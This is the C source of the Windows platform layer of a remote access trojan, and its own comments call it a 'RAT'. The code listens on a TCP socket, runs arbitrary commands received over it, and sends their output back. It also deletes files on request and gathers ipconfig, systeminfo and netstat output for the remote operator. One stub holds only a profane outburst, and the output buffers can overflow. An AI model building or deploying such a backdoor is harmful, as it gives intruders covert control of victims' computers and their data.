/* Dependencies */

#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Common Interface */

#include "interface.h"

/* Platform specific functions for RAT features */
void run_command(SOCKET sockFD, const char *argument)
{
    FILE *fp;
    char path[1035];
    char output[1024] = {0};
    int sentData;

    fp = popen(argument, "r");

    if (fp == NULL)
    {
        printf("Failed to execute command.\n");
	exit(1);
    }

    while (fgets(path, sizeof(path), fp) != NULL)
    {
        strcat(output, path);
    }

    sentData = send(sockFD, output, strlen(output), 0);
}

void read_file(SOCKET sockFD, const char *filepath)
{
    printf("I FUCKING HATE CROSS PLATFORM SHIT\n");
}

void delete_file(SOCKET sockFD, const char *argument)
{
    int sentData;
    char success[] = "File deleted successfully!\n";
    char failure[] = "File could not be deleted!\n";

    if (remove(argument) == 0)
    {
        sentData = send(sockFD, success, strlen(success), 0);
    }

    else
    {
        sentData = send(sockFD, failure, strlen(failure), 0);
    }
}

void system_info(SOCKET sockFD)
{
    FILE *fp;
    char path[1035];
    char output[1024] = {0};
    int sentData;

    fp = popen("ipconfig & systeminfo", "r");

    if (fp == NULL)
    {
        printf("Failed to execute command.\n");
	exit(1);
    }

    else
    {
        while (fgets(path, sizeof(path), fp) != NULL)
	{
            strcat(output, path);
	}
        sentData = send(sockFD, output, strlen(output), 0);
    }
}

void networking_info(SOCKET sockFD)
{
    FILE *fp;
    char path[1035];
    char output[1024] = {0};
    char fail[] = "Failed to execute";
    int sentData;

    fp = popen("netstat -a", "r");

    if (fp == NULL)
    {
        strncpy(output, fail, strlen(fail));
	sentData = send(sockFD, output, strlen(output), 0);
    }

    else 
    {
	while (fgets(path, sizeof(path), fp) != NULL)
	{
            strcat(output, path);
        }

	sentData = send(sockFD, output, strlen(output), 0);
    }
}

/* Socket IO functions with abstract return type */
Hndl create_socket(const char *host, int port)
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int wsaerr;

    wVersionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVersionRequested, &wsaData);

    SOCKET m_socket;
    m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    return m_socket;
}

int bind_socket(int port, SOCKET sockfd)
{
    SOCKADDR_IN ServerAddr;

    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_port = htons(port);
    ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(sockfd, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr)) == 0)
    {
        return 0;
    }

    else
    {
        return 1;
    }
}

int listen_socket(int maxConnections, SOCKET sockfd)
{
    if (listen(sockfd, maxConnections) == 0)
    {
        return 0;
    }

    else
    {
        return 1;
    }
}

Hndl accept_socket(SOCKET sockfd, int port)
{
    SOCKET new_socket;
    new_socket = accept(sockfd, NULL, NULL);

    return new_socket;
}

int read_socket(SOCKET new_socket, char buffer[], int len)
{
    int valRead = recv(new_socket, buffer, len, 0);
    return valRead;
}
